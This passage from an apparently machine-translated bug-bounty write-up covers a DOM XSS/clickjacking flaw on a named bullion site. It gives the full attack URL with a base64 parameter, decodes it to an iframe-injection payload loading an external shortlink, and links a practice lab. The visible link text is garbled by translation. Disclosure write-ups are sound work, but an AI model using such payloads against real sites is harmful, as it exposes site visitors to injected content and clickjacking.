href="https://silvergoldbull.com/bt.html?secK=PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvdHpiRlI2J3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==&amp;g=v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi9GdhhSZ0lmc35CduVWb1N2bkpDdwlmcjNXY2Fma1" rel="noopener ugc nofollow" target="_blank">https://silvergoldbull.com/bt.html?secK = pglmcmftzsbbvbmxvywq 9 indpbmrvdy 5 zdg 9 wkck 7 innyyz 0 nly 9 nb 28 uz 2 wvdhpirli 2j 3n 0 ewxlpsjozwlnahq 6 mtawmhb 4 o 3d pzhroewmcu 7 ym 9 yzgvyojaipg = =&amp;g = V8 ylvstkpkcylnwzzbgkdbgdldgybbhki 9 gdhhsz 0 LMC 35 cduvwb 1 N2 bkpddwlmcjnxy 2 fma 1</a></p></blockquote><p id="472d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">secK的值为:</p><blockquote class="km kn ko"><p id="ff05" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated"><iframe onload="”window.stop();”src=’//goo.gl/tzbFR6'style=”height:1000px;width:100%;border:0&quot;"/></p></blockquote><p id="5b9a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">概念验证:</p><figure class="ls lt lu lv gt lw gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi lr"><img src="../Images/3f2907df48b501b33f24af2d47a46fbe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xPP2CexySrVvMmRHJSm6uA.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">Iframe内的img 7.0<a class="ae kl" href="https://silvergoldbull.com" rel="noopener ugc nofollow" target="_blank">https://silvergoldbull.com</a>网站，准备点击劫持</figcaption></figure><p id="6258" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">修复:</p><p id="7704" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">他们删除了易受攻击的页面，但对于所有想在阅读这篇文章时“练习”并利用这个错误的人，我专门为你创建了一个hack.me:</p><blockquote class="km kn ko"><p id="cb54" class="jn jo kp jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated"><a class="ae kl" href="https://hack.me/104291/dom-xss-2.html" rel="noopener ugc nofollow" target="_blank">https://hack.me/104291/dom-xss-2.html</a></p></blockquote><p id="b752" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢阅读。</p></div></div>    
</body>
</html>